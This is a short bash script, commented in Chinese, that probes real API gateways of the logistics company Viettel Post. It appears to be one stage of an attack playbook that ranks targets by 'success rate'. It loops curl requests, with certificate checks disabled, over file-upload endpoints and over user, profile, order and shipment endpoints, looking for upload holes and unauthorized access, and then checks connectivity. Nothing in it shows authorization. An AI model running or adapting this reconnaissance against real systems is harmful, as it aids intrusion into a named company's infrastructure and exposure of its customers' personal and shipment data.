#!/bin/bash
# Viettel Post API测试 - 按照v10.5优先级

echo "[🔥 P0] 第3.5步：高价值突破点快速探测"
echo ""

# 主API端点
MAIN_API="https://gw.vtpglobal.com.vn"
OMS_API="https://oms-api.vtpglobal.com.vn"

echo "=== 3.5.1 文件上传API测试 （最高优先级 - 成功率95%） ==="
for endpoint in \
    "$MAIN_API/vtp-user/api/v1/upload" \
    "$MAIN_API/tms-receiving/api/v1/upload" \
    "$MAIN_API/tms-handover/api/v1/upload" \
    "$OMS_API/upload" \
    "$OMS_API/api/upload" \
    "$OMS_API/api/v1/upload"
do
    echo "[+] 测试上传: $endpoint"
    curl -sk "$endpoint" -w "\nHTTP: %{http_code}\n" -m 5 2>/dev/null | head -5
    echo "---"
done

echo ""
echo "=== 3.5.2 未授权API测试（第三优先级 - 成功率85%） ==="
for endpoint in \
    "$MAIN_API/vtp-user/api/v1/users" \
    "$MAIN_API/vtp-user/api/v1/profile" \
    "$MAIN_API/tms-receiving/api/v1/orders" \
    "$MAIN_API/tms-dest/api/v1/shipments" \
    "$OMS_API/api/orders" \
    "$OMS_API/api/v1/orders"
do
    echo "[+] 测试未授权访问: $endpoint"
    curl -sk "$endpoint" -w "\nHTTP: %{http_code}\n" -m 5 2>/dev/null | head -5
    echo "---"
done

echo ""
echo "=== 基础连通性测试 ==="
for api in \
    "$MAIN_API" \
    "$OMS_API" \
    "https://ops.vtpmyanmar.com.mm"
do
    echo "[+] $api"
    curl -skI "$api" -m 5 2>/dev/null | head -10
    echo "---"
done
